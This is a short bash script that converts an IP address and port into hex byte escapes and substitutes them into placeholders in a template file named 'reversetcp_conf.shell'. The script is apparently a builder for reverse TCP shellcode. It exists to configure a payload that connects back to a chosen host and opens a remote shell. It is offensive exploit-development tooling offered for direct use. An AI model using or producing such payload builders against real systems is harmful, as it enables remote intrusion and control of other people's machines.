#!/bin/bash

function convert_to_hex() {
	local input=$1
	echo "obase=16;ibase=10;$input" | BC_LINE_LENGTH=9999 bc
}

function pad() {
	local len=$1
	local pad=$2
	local val=$3
	echo $val | awk -v len="$len" -v pad="$pad" '{ l = (len - length % len) % len; printf "%.*s%s\n", l, pad, $0}'
}

function push_fmt() {
	local input=$1
	echo $input | sed -E 's/(.{2})(.{2})/\\\\x\1\\\\x\2/g'
}

function get_octet() {
	local i=$1
	j=$(echo $i | cut -d'.' -f$2)
	k=$(convert_to_hex $j)
        pad 2 "00" $k
}

ip="$1"
fst=$(get_octet $ip 1)
snd=$(get_octet $ip 2)
trd=$(get_octet $ip 3)
frt=$(get_octet $ip 4)
hw1=$(push_fmt "$fst$snd")
hw2=$(push_fmt "$trd$frt")
newip="$hw1$hw2"

port_hex=$(convert_to_hex $2)
port_hex_pad=$(pad 4 "0000" $port_hex)
port_shell=$(push_fmt $port_hex_pad)

sed -E 's/PORTPORT/'"$port_shell"'/g' reversetcp_conf.shell | sed -E 's/IP_ADDR_IP_ADDR_/'"$newip"'/g'
